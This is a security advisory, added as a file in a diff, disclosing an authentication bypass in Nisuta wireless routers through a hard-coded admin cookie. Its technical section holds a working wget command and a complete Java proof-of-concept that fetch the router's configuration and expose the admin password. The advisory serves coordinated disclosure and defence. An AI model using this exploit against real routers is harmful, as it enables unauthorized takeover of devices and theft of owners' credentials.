@@ -1,0 +1,173 @@
+Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability 
+Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
+
+Advisory ID: AMPLIA-ARA050913
+Advisory URL: <tbd>
+Date Published: 12-26-2013 
+Vendors Contacted: Nisuta (www.nisuta.com)
+Release Mode: Coordinated Release 
+Last Updated: 12-25-2013
+
+Index
+-----
+
+1. Vulnerability Information
+2. Vulnerability Description
+3. Vulnerable Systems
+4. Vendor Information, solutions and workarounds
+5. Credits
+6. Technical Description
+7. Disclaimer
+
+
+1.Vulnerability Information
+---------------------------
+
+Impact: Remote attackers can bypass authentication and access the router's management web interface obtaining complete control of the device
+Remotely Exploitable: Yes
+Bugtraid Id: <unknown>
+CVE: <unknown>
+
+2.Vulnerability Description
+----------------------------
+
+The Nisuta (www.nisuta.com) NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default). 
+
+This remote management web interface requires a password.
+
+A remote attacker can bypass authentication and gain access to the remote management web interface, taking control of the device, without knowing the password.
+
+3.Vulnerable Systems
+--------------------
+
+Nisuta NS-WIR150NE wireless router, firmware v5.07.41
+Nisuta NS-WIR300N wireless router, firmware v5.07.36_NIS01 (hardware version v3.0)
+
+and probably other Nisuta wireless routers with similar firmware.
+
+
+4.Vendor Information, Solutions and Workarounds
+-----------------------------------------------
+
+The vendor made available the following firmware updates:
+
+Nisuta NS-WIR150NE
+http://www.nisuta.com/producto.asp?id=NSWIR150NE
+http://www.nisuta.com/drivers/NSWIR150NE.rar
+
+Nisuta NS-WIR150NF
+http://www.nisuta.com/producto.asp?id=NSWIR150NF
+http://www.nisuta.com/drivers/NSWIR150NF.rar
+
+Nisuta NS-WIR300N
+No firmware update is available. The router remains vulnerable.
+
+The fix implemented by the vendor is not optimal, although better than any workaround.
+
+As a workaround, disable remote management on the WAN interface (not enabled by default).  However, it is not possible to disable remote management on the LAN interface, and
+applying the fix is recommended.
+
+It is possible to restrict remote management on the WAN interface based on source IP address, but given the critical nature of this vulnerability we do not recommend it as a workaround.
+
+It is also worth mentioning that the remote management web interface works over http without encryption, even with the flaw described in this advisory fixed, the interface is still insecure for other reasons.
+
+
+5.Credits
+---------
+
+This vulnerability was discovered by Amplia Security Research.
+
+We thank Nisuta for their efforts to try to fix this vulnerability and improve the security of their products.
+
+6. Technical Description
+------------------------
+
+The Nisuta NS-WIR150NE and NS-WIR300N wireless routers provide a remote management web interface available both on the WAN (not enabled by default) and LAN interfaces (enabled by default). 
+
+This remote management web interface requires a password and uses form-based authentication (performed over http without encryption, which is another issue).
+
+After entering the correct password, the router's remote management web interface always sets the same cookie, shown next:
+
+Set-Cookie: admin:language=en; path=/
+
+This cookie is hard-coded and obviously insecure.
+
+Using this cookie in a HTTP request is enough to "bypass authentication" and login to the remote management web interface as an administrator without knowing the password. 
+
+The 'admin' value is not even required.  For example, 
+
+Cookie: :language=en; path=/
+
+is enough to gain access to the router.
+
+
+PoC Exploit:
+
+An unauthenticated remote attacker on the WAN and LAN interfaces can perform any action available on the router's remote management web interface, as an example, the following command will bypass authentication and download the router's configuration which includes the current remote management web interface password among other confidential information:
+
+$ wget --header="Cookie: :language=en" http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg -t 1
+
+The password is in the 'http_passwd' variable:
+
+$ grep http_passwd config.cfg
+http_passwd=mysecretpassword
+$
+
+The attacker can now conveniently login into the remote management web interface with full control and perform changes, obtain information, etc. 
+
+Again, the password is not needed, the attacker can just set the cookie 'admin:language=en' in his browser to gain access to the management interface or  perform other actions directly, this is just an example.
+
+Custom implementation of the PoC exploit:
+
+// Nisuta NS-WIR150NE, NS-WIR300N Wireless Routers Remote Management Web Interface Authentication Bypass Vulnerability 
+// Amplia Security - Amplia Security Research Advisory (AMPLIA-ARA050913)
+// PoC exploit - dumps the router's configuration files which includes the management interface password
+// and other information
+// compile: javac poc.java
+// run: java poc > router.cfg
+
+import java.net.URL;
+import java.net.URLConnection;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+
+public class poc {
+
+	public static void main(String[] args)
+	{
+
+		try { 
+			URL url = new URL("http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg");
+			URLConnection conn = url.openConnection();
+			conn.setRequestProperty("Cookie", ":language=en");
+
+			BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+			String line;
+			while ((line = rd.readLine()) != null) {
+			       System.out.println(line);
+			}
+		
+		} catch(Exception e) {
+
+			e.printStackTrace();
+		}
+	
+		
+	}
+};
+
+
+
+7.Disclaimer
+------------
+
+The contents of this advisory are copyright (c) 2013 Amplia Security (www.ampliasecurity.com), and
+may be distributed freely provided that no fee is charged for distribution and proper credit is given.
+
+
+
+
+
